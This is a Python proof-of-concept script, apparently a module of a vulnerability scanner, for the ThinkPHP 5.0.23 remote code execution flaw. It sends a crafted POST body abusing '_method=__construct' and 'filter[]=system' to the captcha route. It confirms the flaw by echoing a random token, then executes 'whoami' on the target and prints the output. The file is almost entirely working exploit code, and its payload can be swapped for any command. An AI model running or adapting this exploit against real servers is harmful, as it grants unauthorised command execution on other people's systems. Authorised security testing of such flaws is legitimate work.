#!/usr/bin/env python3

'''
name: ThinkPHP5 5.0.23 远程代码执行漏洞
description: ThinkPHP5 5.0.23 远程代码执行漏洞
'''

import urllib
from app.lib.utils.common import get_capta
from app.lib.utils.request import request

class Thinkphp5_5_0_23_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        self.capta = get_capta() 
        self.check_payload =  '''_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=''' + urllib.parse.quote(('echo' + ' ' + self.capta), 'utf-8')
        self.cmd_payload =  '''_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=whoami'''

    def run(self):
        try:
            if not self.url.startswith("http") and not self.url.startswith("https"):
                self.url = "http://" + self.url
            if 'index.php' not in self.url:
                self.url = self.url + '/index.php?s=captcha'
            if 'index.php' in self.url and '/?s=captcha' not in self.url:
                self.url = self.url + '/?s=captcha'
            check_req = request.post(self.url, data = self.check_payload, headers = self.headers)
            if check_req.status_code == 200 and self.capta in check_req.text:
                cmd_req = request.post(self.url, data = self.cmd_payload, headers = self.headers)
                print ('存在ThinkPHP5 5.0.23 远程代码执行漏洞,执行whoami命令成功，执行结果是:', cmd_req.text.split('\n')[0])
                return True
            else:
                print('不存在ThinkPHP5 5.0.23 远程代码执行漏洞')
                return False
        except Exception as e:
            print (e)
            return False
        finally:
            pass

if  __name__ == "__main__":
    Thinkphp5_5_0_23 = Thinkphp5_5_0_23_BaseVerify('http://192.168.100.64/public/')
    Thinkphp5_5_0_23.run()